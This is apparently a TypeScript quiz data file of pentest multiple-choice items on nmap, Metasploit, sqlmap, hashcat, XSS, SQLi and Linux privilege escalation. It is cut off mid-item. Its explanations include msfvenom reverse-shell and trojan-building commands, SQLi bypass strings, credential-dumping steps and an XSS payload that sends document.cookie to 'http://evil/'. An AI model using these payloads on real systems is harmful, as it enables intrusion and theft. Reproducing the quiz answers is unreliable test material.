// LEVEL 9 INTERMEDIATE — Hacking & Pentest (100 unique questions)
// Topics: Recon, enumeration, Metasploit, privilege escalation, XSS, SQLi, Hashcat

export const level9Intermediate = [
  (_i: number) => ({
    q: "What does `nmap -sA target` do?",
    o: ["ACK scan (detects stateful firewalls)", "ACK scan", "Firewall detection", "Stealth ACK"],
    c: 0,
    e: "nmap -sA. ACK packets. No handshake. Maps firewall rules. Filtered vs unfiltered.",
    de: "nmap -sA 192.168.1.1. Stateful firewall detection. RST vs no response."
  }),
  (_i: number) => ({
    q: "What does `nmap -sV --version-intensity 5` increase?",
    o: ["Probe depth (more version probes)", "Version intensity", "Probe depth", "Version probes"],
    c: 0,
    e: "version-intensity 0-9. 5 = default. 9 = exhaustive. Slower, more accurate.",
    de: "nmap -sV --version-intensity 9. More probes. Identify obscure services."
  }),
  (_i: number) => ({
    q: "What does `nmap --script http-enum target` find?",
    o: ["Web paths, admin panels, common files", "HTTP enum", "Web paths", "Admin panels"],
    c: 0,
    e: "http-enum NSE. Common paths. /admin, /backup. Web enumeration.",
    de: "nmap --script http-enum -p 80,443 target. Discovers web structure."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p linux/x64/meterpreter/reverse_tcp` require?",
    o: ["LHOST and LPORT for callback", "Callback params", "LHOST LPORT", "Reverse connection"],
    c: 0,
    e: "LHOST=attacker, LPORT=4444. Payload connects back. Listener on attacker.",
    de: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf."
  }),
  (_i: number) => ({
    q: "What does `use exploit/multi/handler` in Metasploit set up?",
    o: ["Listener for reverse shells", "Reverse handler", "Payload listener", "Callback handler"],
    c: 0,
    e: "multi/handler. Listens. Matches payload. exploit -j for background.",
    de: "use exploit/multi/handler. set payload. set LHOST, LPORT. exploit."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --level=5` increase?",
    o: ["Test depth (more injection points)", "Test level", "Injection depth", "SQLi level"],
    c: 0,
    e: "sqlmap --level 1-5. 5 = all. Cookie, Referer, etc. More requests.",
    de: "sqlmap -u URL --level=5 --risk=3. Exhaustive. Slower. More coverage."
  }),
  (_i: number) => ({
    q: "What does XSS (Cross-Site Scripting) allow?",
    o: ["Inject JS into page (runs in victim browser)", "Script injection", "JS injection", "Client-side attack"],
    c: 0,
    e: "XSS = inject script. Stored, reflected, DOM. Steal cookies, keylog. Input validation.",
    de: "<script>alert(1)</script>. Cookie theft. Session hijack. CSP mitigates."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 1000` crack?",
    o: ["NTLM hashes (Windows)", "NTLM", "Hash type 1000", "Windows hash"],
    c: 0,
    e: "hashcat -m 1000. NTLM. Windows. Dump from SAM, NTDS. Common in pentest.",
    de: "hashcat -m 1000 ntlm.txt wordlist.txt. -m 0 MD5, -m 1800 SHA512."
  }),
  (_i: number) => ({
    q: "What does `linpeas.sh` enumerate?",
    o: ["Linux privilege escalation vectors", "LinPEAS", "Priv esc", "Linux enum"],
    c: 0,
    e: "linpeas. Automated. SUID, writable, cron, sudo. Privilege escalation.",
    de: "linpeas.sh. PEASS. Colors. SUID, capabilities, passwords. Quick wins."
  }),
  (_i: number) => ({
    q: "What does `nmap -sN target` do?",
    o: ["Null scan (no flags set)", "Null scan", "TCP null", "Stealth null"],
    c: 0,
    e: "nmap -sN. No flags. Open = no response. Filtered = RST. Requires root.",
    de: "nmap -sN. Windows doesn't respond. Linux RST. OS fingerprint."
  }),
  (_i: number) => ({
    q: "What does `nmap --script smb-enum-shares target` list?",
    o: ["SMB shares without auth", "SMB shares", "Share enum", "Windows shares"],
    c: 0,
    e: "smb-enum-shares. Anonymous. Null session. Share names. Windows recon.",
    de: "nmap -p 445 --script smb-enum-shares 192.168.1.1. C$, IPC$."
  }),
  (_i: number) => ({
    q: "What does `msfconsole` command `search type:exploit` filter?",
    o: ["Only exploit modules", "Exploit search", "Module type", "Exploit filter"],
    c: 0,
    e: "search type:exploit. Excludes aux, post. search cve:2021. CVE search.",
    de: "search type:exploit platform:windows. search cve:2017. Module discovery."
  }),
  (_i: number) => ({
    q: "What does `setg RHOSTS` in Metasploit do?",
    o: ["Sets global (all modules use it)", "Global set", "Set global", "RHOSTS global"],
    c: 0,
    e: "setg = global. set = local. RHOSTS applies to next exploit. setg persists.",
    de: "setg RHOSTS 192.168.1.0/24. setg LHOST 10.0.0.1. Saves typing."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --cookie='session=abc'` use?",
    o: ["Authenticated session for testing", "Cookie auth", "Session cookie", "Auth cookie"],
    c: 0,
    e: "sqlmap --cookie. Authenticated. Test behind login. Burp export cookie.",
    de: "sqlmap -u URL --cookie='session=abc'. Logged-in. More injection points."
  }),
  (_i: number) => ({
    q: "What does `' OR 1=1--` in SQLi typically test?",
    o: ["Authentication bypass (always true)", "Auth bypass", "Always true", "OR 1=1"],
    c: 0,
    e: "OR 1=1--. Comment bypass. Always true. Login bypass. Classic test.",
    de: "admin' OR 1=1--. Bypass. SQL injection. Parameterized queries fix."
  }),
  (_i: number) => ({
    q: "What does `hashcat -a 0` specify?",
    o: ["Straight/dictionary attack", "Dictionary mode", "Attack mode 0", "Wordlist"],
    c: 0,
    e: "hashcat -a 0. Straight. Wordlist. -a 1 = combo. -a 3 = brute. -a 6 = hybrid.",
    de: "hashcat -a 0 -m 1000 hash.txt wordlist.txt. Dictionary. -a 3 = mask."
  }),
  (_i: number) => ({
    q: "What does `sudo -l` show for privilege escalation?",
    o: ["Commands user can run as root", "Sudo list", "Sudo perms", "Priv esc vector"],
    c: 0,
    e: "sudo -l. NOPASSWD. /usr/bin/vi = edit. /usr/bin/find = exec. GTFObin.",
    de: "sudo -l. (ALL) NOPASSWD. sudo -u root /path. Escalation path."
  }),
  (_i: number) => ({
    q: "What does `nmap -sX target` do?",
    o: ["Xmas scan (FIN, PSH, URG flags)", "Xmas scan", "TCP Xmas", "Flags scan"],
    c: 0,
    e: "nmap -sX. FIN, PSH, URG. Like null. Open = no response. Stealth.",
    de: "nmap -sX. Obsolete on modern. RFC. Some firewalls. IDS evasion."
  }),
  (_i: number) => ({
    q: "What does `nmap --script dns-brute target` do?",
    o: ["Subdomain brute force via DNS", "DNS brute", "Subdomain enum", "DNS brute force"],
    c: 0,
    e: "dns-brute. Wordlist. Subdomains. DNS recon. api., dev., etc.",
    de: "nmap --script dns-brute domain.com. Discovers. gobuster dns alternative."
  }),
  (_i: number) => ({
    q: "What does `run post/multi/gather/env` in Metasploit do?",
    o: ["Gathers environment info from session", "Env gather", "Post gather", "Environment"],
    c: 0,
    e: "post/multi/gather/env. After session. Env vars, path. Reconnaissance.",
    de: "run post/multi/gather/env. Needs meterpreter. Info gathering."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -e x86/shikata_ga_nai` add?",
    o: ["Polymorphic encoding (evade AV)", "Encoding", "AV evasion", "Shikata"],
    c: 0,
    e: "msfvenom -e. Encoder. x86/shikata_ga_nai. Polymorphic. -i 5 iterations.",
    de: "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --technique=U` test?",
    o: ["UNION-based SQL injection", "UNION technique", "SQLi UNION", "Technique U"],
    c: 0,
    e: "sqlmap --technique=U. UNION. Extract data. B=boolean, E=error, T=time. U=union.",
    de: "sqlmap -u URL --technique=U. UNION SELECT. Data extraction."
  }),
  (_i: number) => ({
    q: "What does `document.cookie` in XSS allow?",
    o: ["Steal session cookie (session hijack)", "Cookie theft", "Session hijack", "XSS cookie"],
    c: 0,
    e: "XSS + document.cookie. Send to attacker. Session hijack. HttpOnly mitigates.",
    de: "<script>fetch('http://evil/?c='+document.cookie)</script>. Steal cookie."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 1800` crack?",
    o: ["SHA512 (Unix)", "SHA512", "Unix hash", "Hash type 1800"],
    c: 0,
    e: "hashcat -m 1800. SHA512. /etc/shadow. $6$... Linux. Unix.",
    de: "hashcat -m 1800 shadow.txt wordlist.txt. $6$ rounds. Linux cracking."
  }),
  (_i: number) => ({
    q: "What does `find / -perm -4000` find?",
    o: ["SUID binaries (potential priv esc)", "SUID files", "SUID bin", "Priv esc"],
    c: 0,
    e: "find / -perm -4000. SUID. Run as owner. Often root. GTFObin exploit.",
    de: "find / -perm -4000 2>/dev/null. /usr/bin/find, vim. Exploit path."
  }),
  (_i: number) => ({
    q: "What does `nmap -sW target` do?",
    o: ["Window scan (TCP window size)", "Window scan", "TCP window", "Window size"],
    c: 0,
    e: "nmap -sW. Window size. Open vs closed. Different. Rare. OS detection.",
    de: "nmap -sW. Window size varies. Open vs closed. Obsolete on many."
  }),
  (_i: number) => ({
    q: "What does `nmap --script vuln target` NOT do?",
    o: ["Exploit vulnerabilities (only detects)", "No exploit", "Detection only", "No auto exploit"],
    c: 0,
    e: "vuln scripts detect. Don't exploit. Report. Manual exploit. Authorize.",
    de: "nmap --script vuln. CVE check. No exploit. Pentest. Manual step."
  }),
  (_i: number) => ({
    q: "What does `sessions -i 1` in Metasploit do?",
    o: ["Interact with session 1", "Session interact", "Attach session", "Session 1"],
    c: 0,
    e: "sessions -i 1. Interact. sessions. Background with Ctrl+Z. Multiple.",
    de: "sessions. sessions -i 1. Meterpreter. background. Ctrl+Z."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f raw` output?",
    o: ["Raw shellcode (no format)", "Raw shellcode", "No format", "Raw bytes"],
    c: 0,
    e: "msfvenom -f raw. Shellcode. No ELF, PE. For injection. Custom use.",
    de: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 -f raw. Shellcode."
  }),
  (_i: number) => ({
    q: "What does `sqlmap -r request.txt` use?",
    o: ["HTTP request from file (Burp capture)", "Request file", "Burp capture", "HTTP file"],
    c: 0,
    e: "sqlmap -r request.txt. Full request. Burp. All params. Cookie, headers.",
    de: "sqlmap -r request.txt. Paste from Burp. All parameters. Post data."
  }),
  (_i: number) => ({
    q: "What does `UNION SELECT NULL,NULL,NULL` in SQLi find?",
    o: ["Number of columns (match query)", "Column count", "UNION columns", "NULL test"],
    c: 0,
    e: "UNION SELECT NULL. Match columns. Add NULL until no error. Then replace data.",
    de: "UNION SELECT 1,NULL,NULL. Error = wrong count. NULL,NULL,NULL works."
  }),
  (_i: number) => ({
    q: "What does `hashcat -a 3 ?d?d?d?d?d?d?d?d?d` crack?",
    o: ["8-digit numeric brute force", "Numeric brute", "8 digits", "Mask attack"],
    c: 0,
    e: "hashcat -a 3. Mask. ?d=digit. ?l=lower. ?u=upper. ?s=special. 8 digits.",
    de: "hashcat -a 3 -m 0 hash ?d?d?d?d?d?d?d?d. 00000000-99999999."
  }),
  (_i: number) => ({
    q: "What does `crontab -l` as root show for priv esc?",
    o: ["Scheduled jobs (writable script?)", "Cron jobs", "Scheduled tasks", "Cron enum"],
    c: 0,
    e: "crontab -l. /etc/crontab. cron.d. Writable script = code exec. Path.",
    de: "crontab -l. /etc/cron.d. Writable script. Reverse shell. Privilege escalation."
  }),
  (_i: number) => ({
    q: "What does `nmap -sI zombie:port target` do?",
    o: ["Idle scan (zombie as proxy)", "Idle scan", "Zombie scan", "Stealth scan"],
    c: 0,
    e: "nmap -sI. Idle scan. Zombie. IP ID. No direct packets. Stealth.",
    de: "nmap -sI 192.168.1.50:80 192.168.1.1. Zombie. Covert scanning."
  }),
  (_i: number) => ({
    q: "What does `nmap --script ssh-auth-methods target` show?",
    o: ["Allowed SSH auth methods", "SSH auth", "Auth methods", "SSH enum"],
    c: 0,
    e: "ssh-auth-methods. publickey, password, keyboard-interactive. Recon.",
    de: "nmap -p 22 --script ssh-auth-methods target. Auth config. Hardening."
  }),
  (_i: number) => ({
    q: "What does `run post/linux/gather/hashdump` require?",
    o: ["Root/sudo on target (reads shadow)", "Root/sudo", "Hashdump", "Shadow access"],
    c: 0,
    e: "post/linux/gather/hashdump. Needs root. /etc/shadow. Dump hashes.",
    de: "run post/linux/gather/hashdump. Meterpreter. Root. Crack offline."
  }),
  (_i: number) => ({
    q: "What does `set PAYLOAD generic/shell_reverse_tcp` use?",
    o: ["Basic reverse shell (not Meterpreter)", "Basic shell", "Shell payload", "Reverse shell"],
    c: 0,
    e: "generic/shell_reverse_tcp. Dumb shell. Not Meterpreter. Simpler. Compatible.",
    de: "set PAYLOAD generic/shell_reverse_tcp. set LHOST, LPORT. exploit."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --os-shell` attempt?",
    o: ["OS command execution via SQLi", "OS shell", "SQLi RCE", "Command exec"],
    c: 0,
    e: "sqlmap --os-shell. RCE. xp_cmdshell, INTO OUTFILE. Requires privilege.",
    de: "sqlmap -u URL --os-shell. MySQL. INTO OUTFILE. File write. RCE."
  }),
  (_i: number) => ({
    q: "What does `' AND SLEEP(5)--` in SQLi test?",
    o: ["Time-based blind SQLi (delayed response)", "Time-based", "Blind SQLi", "SLEEP test"],
    c: 0,
    e: "SLEEP(5). Time-based. Blind. No output. Delay = injectable. MySQL.",
    de: "SLEEP(5), BENCHMARK(). pg_sleep(5). Time-based. Blind. Boolean alternative."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 3200` crack?",
    o: ["bcrypt hashes", "bcrypt", "Hash 3200", "Bcrypt crack"],
    c: 0,
    e: "hashcat -m 3200. bcrypt. $2a$, $2y$. Slow. Wordlist. Expensive.",
    de: "hashcat -m 3200 bcrypt.txt wordlist.txt. Slow. bcrypt designed. Cost."
  }),
  (_i: number) => ({
    q: "What does `getcap` show for priv esc?",
    o: ["File capabilities (cap_net_bind_service, etc)", "Capabilities", "File caps", "Cap enum"],
    c: 0,
    e: "getcap -r /. cap_net_bind_service. cap_setuid. Exploit. Bypass.",
    de: "getcap -r / 2>/dev/null. /usr/bin/ping = cap_net_raw. Privilege."
  }),
  (_i: number) => ({
    q: "What does `nmap -sF target` do?",
    o: ["FIN scan (FIN only)", "FIN scan", "TCP FIN", "Stealth FIN"],
    c: 0,
    e: "nmap -sF. FIN only. Like null. Open = no response. Filtered = RST.",
    de: "nmap -sF. FIN. Stealth. RFC. IDS evasion. Windows vs Linux."
  }),
  (_i: number) => ({
    q: "What does `nmap --script http-headers target` show?",
    o: ["HTTP response headers", "HTTP headers", "Header enum", "Server headers"],
    c: 0,
    e: "http-headers. Server, X-Powered-By. Version disclosure. Info leak.",
    de: "nmap -p 80,443 --script http-headers target. Server: Apache/2.4."
  }),
  (_i: number) => ({
    q: "What does `exploit -j` in Metasploit do?",
    o: ["Runs exploit in background (job)", "Background exploit", "Job mode", "Exploit job"],
    c: 0,
    e: "exploit -j. Job. Background. Multiple exploits. sessions. Non-blocking.",
    de: "exploit -j. jobs. sessions. Run multiple. Handler. Parallel."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -k` do?",
    o: ["Preserves template (payload in existing exe)", "Template preserve", "Inject payload", "Keep template"],
    c: 0,
    e: "msfvenom -k. Template. Inject. Don't replace. Preserve. Windows.",
    de: "msfvenom -p windows/meterpreter/reverse_tcp -k -x legit.exe. Trojan."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --batch` do?",
    o: ["No prompts (defaults)", "Batch mode", "No interaction", "Auto mode"],
    c: 0,
    e: "sqlmap --batch. No prompts. Default yes. Automation. Scripting.",
    de: "sqlmap -u URL --batch. No 'Continue?'. CI. Automation."
  }),
  (_i: number) => ({
    q: "What does `CSP (Content Security Policy)` mitigate?",
    o: ["XSS (restricts script sources)", "XSS mitigation", "CSP", "Script restrict"],
    c: 0,
    e: "CSP. script-src. Restricts. Inline. External. XSS. Defense.",
    de: "Content-Security-Policy: script-src 'self'. No inline. XSS mitigation."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 5500` crack?",
    o: ["NetNTLMv1 (challenge-response)", "NetNTLMv1", "Hash 5500", "NTLMv1"],
    c: 0,
    e: "hashcat -m 5500. NetNTLMv1. SMB. Responder. Captured. Crack.",
    de: "hashcat -m 5500 netntlmv1.txt wordlist. Responder capture. SMB."
  }),
  (_i: number) => ({
    q: "What does `ls -la /etc/cron.d/` show for priv esc?",
    o: ["Cron jobs (writable script?)", "Cron.d", "Cron jobs", "Scheduled tasks"],
    c: 0,
    e: "ls -la /etc/cron.d/.*. Writable. Add job. Cron runs as root. Escalate.",
    de: "Cron.d. Writable. Echo payload > script. Chmod +x. Root runs."
  }),
  (_i: number) => ({
    q: "What does `nmap -sZ target` do?",
    o: ["COOKIE scan (obsolete)", "COOKIE scan", "TCP COOKIE", "Obsolete scan"],
    c: 0,
    e: "nmap -sZ. COOKIE. Obsolete. Rare. Historical. Scan types.",
    de: "nmap -sZ. COOKIE. Legacy. Uncommon. Scan type reference."
  }),
  (_i: number) => ({
    q: "What does `nmap --script snmp-brute target` do?",
    o: ["SNMP community string brute force", "SNMP brute", "Community string", "SNMP enum"],
    c: 0,
    e: "snmp-brute. Wordlist. public, private. Community. Network info.",
    de: "nmap -p 161 --script snmp-brute target. Community strings. Enum."
  }),
  (_i: number) => ({
    q: "What does `load mimikatz` in Meterpreter do?",
    o: ["Loads Mimikatz for credential dump", "Mimikatz", "Cred dump", "Password dump"],
    c: 0,
    e: "load mimikatz. Windows. Credentials. SAM. LSASS. Kerberos. Post-exploit.",
    de: "load mimikatz. mimikatz_command -f sekurlsa::logonpasswords. Creds."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f python` output?",
    o: ["Python bytes (for injection)", "Python format", "Python payload", "Bytes format"],
    c: 0,
    e: "msfvenom -f python. buf = bytes. Python. C, C#, raw. Format.",
    de: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 -f python."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --random-agent` do?",
    o: ["Random User-Agent (evade WAF)", "Random UA", "WAF evasion", "User-Agent"],
    c: 0,
    e: "sqlmap --random-agent. Rotate UA. WAF evasion. Fingerprint. Random.",
    de: "sqlmap -u URL --random-agent. Bypass. WAF. Rate limit."
  }),
  (_i: number) => ({
    q: "What does `' AND 1=1--` vs `' AND 1=2--` in SQLi differ?",
    o: ["Boolean test (true vs false response)", "Boolean blind", "True false", "Blind test"],
    c: 0,
    e: "1=1 true, 1=2 false. Different response. Content. Boolean blind. Extract bit by bit.",
    de: "Boolean blind. 1=1 = normal. 1=2 = different. Extract data. SUBSTRING."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 13100` crack?",
    o: ["Kerberos KRB5TGS", "Kerberos", "TGS", "Hash 13100"],
    c: 0,
    e: "hashcat -m 13100. Kerberos. TGS. Hashcat. AS-REP. Kerberoasting.",
    de: "hashcat -m 13100 kerberos.txt wordlist. Kerberoasting. TGS-REP."
  }),
  (_i: number) => ({
    q: "What does `cat /etc/passwd` show for priv esc?",
    o: ["Users, shells, UIDs (writable?)", "Passwd file", "User enum", "UID info"],
    c: 0,
    e: "cat /etc/passwd. Users. Shells. UID 0. Writable = add user. Rare.",
    de: "passwd. /bin/bash. UID 0 = root. Writable = add user. Escalate."
  }),
  (_i: number) => ({
    q: "What does `nmap -sY target` do?",
    o: ["SCTP INIT scan", "SCTP scan", "SCTP INIT", "SCTP"],
    c: 0,
    e: "nmap -sY. SCTP. INIT. SCTP protocol. Rare. Telecom. VoIP.",
    de: "nmap -sY. SCTP. Stream Control. Protocol. Specialized."
  }),
  (_i: number) => ({
    q: "What does `nmap --script mysql-enum target` find?",
    o: ["MySQL users, databases", "MySQL enum", "Database enum", "MySQL info"],
    c: 0,
    e: "mysql-enum. Users. Databases. Version. MySQL recon. Empty password.",
    de: "nmap -p 3306 --script mysql-enum target. Users. Enum."
  }),
  (_i: number) => ({
    q: "What does `migrate` in Meterpreter do?",
    o: ["Moves to another process (persistence)", "Process migrate", "Migrate", "Persistence"],
    c: 0,
    e: "migrate PID. Move to process. Survive. Target dies. Explorer. Stable.",
    de: "migrate 1234. Process. If target killed. New process. Persistence."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f c` output?",
    o: ["C array (shellcode)", "C format", "C array", "Shellcode C"],
    c: 0,
    e: "msfvenom -f c. C. unsigned char buf[]. Shellcode. Buffer overflow.",
    de: "msfvenom -p linux/x64/shell_reverse_tcp -f c. C code. Exploit."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --dbms=mysql` do?",
    o: ["Skips DB detection (faster)", "Skip detection", "DBMS hint", "MySQL only"],
    c: 0,
    e: "sqlmap --dbms=mysql. Known. Skip. Faster. Direct. Less detection.",
    de: "sqlmap -u URL --dbms=mysql. Known. Skip fingerprint. Faster."
  }),
  (_i: number) => ({
    q: "What does `HttpOnly` cookie flag prevent?",
    o: ["JS access to cookie (XSS theft)", "No JS access", "HttpOnly", "Cookie protect"],
    c: 0,
    e: "HttpOnly. document.cookie. No. XSS. Can't steal. Set-Cookie.",
    de: "Set-Cookie: session=abc; HttpOnly. XSS can't read. Mitigation."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 1700` crack?",
    o: ["SHA512($pass.$salt)", "SHA512 with salt", "Hash 1700", "Salted SHA512"],
    c: 0,
    e: "hashcat -m 1700. SHA512. Salt. Custom. Format. hash:salt.",
    de: "hashcat -m 1700 hash:salt wordlist. Salted. Format. Cracking."
  }),
  (_i: number) => ({
    q: "What does `id` show for priv esc?",
    o: ["UID, GID, groups (sudo? docker?)", "User info", "ID output", "Groups"],
    c: 0,
    e: "id. uid, gid, groups. docker = container escape. sudo = sudo -l. Enum.",
    de: "id. groups. docker. sudo. adm. Privilege. Escalation path."
  }),
  (_i: number) => ({
    q: "What does `nmap -sO target` do?",
    o: ["IP protocol scan (OSI L3)", "IP protocol", "Protocol scan", "L3 scan"],
    c: 0,
    e: "nmap -sO. IP protocols. 1=ICMP, 6=TCP, 17=UDP. Protocol scan.",
    de: "nmap -sO target. IP protocol. Which protocols. Open. Filtered."
  }),
  (_i: number) => ({
    q: "What does `nmap --script vulners target` show?",
    o: ["CVEs for detected services", "Vulners", "CVE info", "Vulnerability"],
    c: 0,
    e: "vulners. CVE. Version. vulners.com. Database. Exploit.",
    de: "nmap -sV --script vulners target. CVE-2021-1234. Version match."
  }),
  (_i: number) => ({
    q: "What does `run post/windows/gather/credentials/windows` do?",
    o: ["Dumps Windows credentials", "Cred dump", "Windows creds", "Credential gather"],
    c: 0,
    e: "post/windows/gather/credentials. SAM. LSASS. Hashes. Credentials.",
    de: "run post/windows/gather/credentials/windows. Meterpreter. Admin. Dump."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f elf` create?",
    o: ["Linux executable", "ELF format", "Linux binary", "ELF binary"],
    c: 0,
    e: "msfvenom -f elf. Linux. ELF. Executable. chmod +x. Run.",
    de: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 -f elf -o shell.elf."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --tamper=space2comment` do?",
    o: ["Replaces space with comment (WAF bypass)", "Tamper script", "WAF bypass", "Space bypass"],
    c: 0,
    e: "sqlmap --tamper. Modify. space2comment. /**/. Bypass. WAF. Evasion.",
    de: "sqlmap -u URL --tamper=space2comment. Evasion. Multiple tampers."
  }),
  (_i: number) => ({
    q: "What does `' OR 1=1--` in SQLi bypass?",
    o: ["WHERE clause (always true)", "WHERE bypass", "Condition bypass", "Always true"],
    c: 0,
    e: "OR 1=1. WHERE. Bypass. All rows. -- comments. Auth. Logic.",
    de: "SELECT * FROM users WHERE user='' OR 1=1--' AND pass=''. Bypass."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 500` crack?",
    o: ["md5crypt (Unix)", "md5crypt", "Hash 500", "Unix MD5"],
    c: 0,
    e: "hashcat -m 500. md5crypt. $1$. Apache. Unix. Legacy.",
    de: "hashcat -m 500 md5crypt.txt wordlist. $1$salt$hash. Unix."
  }),
  (_i: number) => ({
    q: "What does `cat /etc/shadow` require?",
    o: ["Root (or shadow group)", "Root access", "Shadow read", "Privilege"],
    c: 0,
    e: "cat /etc/shadow. Root. Hashes. Crack. linpeas. Privilege.",
    de: "Root. /etc/shadow. $6$... Hashcat. Crack. Privilege escalation."
  }),
  (_i: number) => ({
    q: "What does `nmap -sL 192.168.1.0/24` do?",
    o: ["List scan (DNS only, no port scan)", "List scan", "DNS only", "Host list"],
    c: 0,
    e: "nmap -sL. List. DNS. No port. No probe. Hostnames. Recon.",
    de: "nmap -sL 192.168.1.0/24. Hostnames. DNS. No port. Stealth."
  }),
  (_i: number) => ({
    q: "What does `nmap --script ftp-anon target` test?",
    o: ["Anonymous FTP login", "FTP anon", "Anonymous FTP", "FTP enum"],
    c: 0,
    e: "ftp-anon. Anonymous. Anonymous. No password. Login. Files.",
    de: "nmap -p 21 --script ftp-anon target. Anonymous. Access."
  }),
  (_i: number) => ({
    q: "What does `background` in Meterpreter do?",
    o: ["Puts session in background (keeps alive)", "Background session", "Detach", "Keep alive"],
    c: 0,
    e: "background. Ctrl+Z. Session. Background. sessions. Interact. Non-blocking.",
    de: "background. sessions. sessions -i 1. Multiple. Handler. Parallel."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f exe` create?",
    o: ["Windows executable", "EXE format", "Windows binary", "PE binary"],
    c: 0,
    e: "msfvenom -f exe. Windows. PE. exe. Run. Trojan. Payload.",
    de: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 -f exe -o shell.exe."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --dump` do?",
    o: ["Extracts all data from table", "Dump table", "Data extract", "Table dump"],
    c: 0,
    e: "sqlmap --dump. Dump. Table. --dump. -D db -T users. Extract.",
    de: "sqlmap -u URL -D db -T users --dump. Extract. All rows. Data."
  }),
  (_i: number) => ({
    q: "What does `innerHTML` without sanitization cause?",
    o: ["XSS (reflects user input)", "XSS vector", "innerHTML XSS", "DOM XSS"],
    c: 0,
    e: "innerHTML = user. No sanitize. XSS. Reflect. Execute. Dangerous.",
    de: "element.innerHTML = userInput. XSS. <script>. Sanitize. textContent."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 2900` crack?",
    o: ["Raw SHA-256", "SHA256", "Hash 2900", "Raw SHA256"],
    c: 0,
    e: "hashcat -m 2900. Raw SHA256. 64 hex. No salt. Simple.",
    de: "hashcat -m 2900 sha256.txt wordlist. Raw. 64 char hex."
  }),
  (_i: number) => ({
    q: "What does `uname -a` show for priv esc?",
    o: ["Kernel version (exploit?)", "Kernel info", "Version", "Kernel exploit"],
    c: 0,
    e: "uname -a. Kernel. Version. CVE. exploit-db. Dirty COW. Enum.",
    de: "uname -a. Linux 4.4.0. searchsploit. CVE. Kernel exploit."
  }),
  (_i: number) => ({
    q: "What does `nmap -sR target` do?",
    o: ["RPC scan (SunRPC)", "RPC scan", "SunRPC", "RPC enum"],
    c: 0,
    e: "nmap -sR. RPC. SunRPC. rpcinfo. -sV. RPC. NFS. etc.",
    de: "nmap -sR target. RPC. Portmap. rpcinfo. Enum."
  }),
  (_i: number) => ({
    q: "What does `nmap --script http-methods target` show?",
    o: ["Allowed HTTP methods (GET, POST, etc)", "HTTP methods", "Method enum", "REST methods"],
    c: 0,
    e: "http-methods. OPTIONS. GET, POST, PUT, DELETE. Allowed. REST.",
    de: "nmap -p 80,443 --script http-methods target. PUT, DELETE. Dangerous."
  }),
  (_i: number) => ({
    q: "What does `run post/multi/recon/local_exploit_suggester` do?",
    o: ["Suggests local exploits for session", "Exploit suggester", "Local exploits", "Priv esc"],
    c: 0,
    e: "local_exploit_suggester. Session. Suggests. Local. Exploit. Privilege.",
    de: "run post/multi/recon/local_exploit_suggester. Meterpreter. Suggestions."
  }),
  (_i: number) => ({
    q: "What does `msfvenom -p payload -f war` create?",
    o: ["Java WAR (web app)", "WAR format", "Java WAR", "Web app"],
    c: 0,
    e: "msfvenom -f war. Java. WAR. Web. Deploy. Tomcat. JSP.",
    de: "msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.2.3.4 -f war -o shell.war."
  }),
  (_i: number) => ({
    q: "What does `sqlmap --level=3` include?",
    o: ["Cookie and Referer headers", "Level 3", "More params", "Header injection"],
    c: 0,
    e: "sqlmap --level 3. Cookie. Referer. User-Agent. More. Injection points.",
    de: "sqlmap -u URL --level=3. Cookie. Referer. More coverage."
  }),
  (_i: number) => ({
    q: "What does `eval()` with user input cause?",
    o: ["Code injection (XSS or RCE)", "Eval injection", "Code exec", "Dangerous eval"],
    c: 0,
    e: "eval(userInput). Execute. Code. Injection. XSS. RCE. Never.",
    de: "eval(userInput). Arbitrary. Code. Dangerous. Avoid. Sanitize."
  }),
  (_i: number) => ({
    q: "What does `hashcat -m 5600` crack?",
    o: ["NetNTLMv2", "NetNTLMv2", "Hash 5600", "NTLMv2"],
    c: 0,
    e: "hashcat -m 5600. NetNTLMv2. Responder. SMB. Captured. Crack.",
    de: "hashcat -m 5600 netntlmv2.txt wordlist. Responder. SMB. Capture."
  }),
  (_i: number) => ({
    q: "What does `env` show for priv esc?",
    o: ["Environment (PATH, creds?)", "Environment", "Env vars", "PATH"],
    c: 0,
    e: "env. PATH. Credentials. AWS. API keys. Secrets. Leak.",
    de: "env. PATH. AWS_SECRET. Keys. Credentials. Enum."
  }),
  (_i: number) => ({
    q: "What does `nmap -sT target` do?",
    o: ["Full TCP connect (no root needed)", "Connect scan", "TCP connect", "Full scan"],
    c: 0,
    e: "nmap -sT. Full connect. 3-way. No root. Slower. Logged.",
    de: "nmap -sT. Full connect. SYN default. -sT no root. No stealth."
  }),
  (_i: number) => ({
    q: "What does `nmap --script http-csrf target` check?",
    o: ["CSRF token presence", "CSRF check", "Token check", "CSRF token"],
    c: 0,
    e: "http-csrf. Token. CSRF. Protection. Missing. Vulnerability.",
